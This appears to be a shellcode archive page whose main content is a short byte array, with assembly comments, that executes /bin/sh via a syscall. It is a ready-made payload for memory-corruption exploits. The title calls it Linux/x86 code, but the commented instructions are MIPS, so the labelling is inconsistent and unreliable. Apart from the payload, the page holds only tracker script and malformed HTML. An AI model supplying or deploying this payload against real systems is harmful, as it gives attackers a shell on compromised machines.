<html><head><title>Linux/x86 - execve(/bin/sh) - 43 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
char shellcode[]=
                      &quot;\x04\x10\xff\xff&quot;             /* bltzal  $zero,&lt;_shellcode&gt;    */
                      &quot;\x24\x02\x03\xf3&quot;             /* li      $v0,1011              */
                      &quot;\x23\xff\x02\x14&quot;             /* addi    $ra,$ra,532           */
                      &quot;\x23\xe4\xfe\x08&quot;             /* addi    $a0,$ra,-504          */
                      &quot;\x23\xe5\xfe\x10&quot;             /* addi    $a1,$ra,-496          */
                      &quot;\xaf\xe4\xfe\x10&quot;             /* sw      $a0,-496($ra)         */
                      &quot;\xaf\xe0\xfe\x14&quot;             /* sw      $zero,-492($ra)       */
                      &quot;\xa3\xe0\xfe\x0f&quot;             /* sb      $zero,-497($ra)       */
                      &quot;\x03\xff\xff\xcc&quot;             /* syscall                       */
                      &quot;/bin/sh&quot;
                   ;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
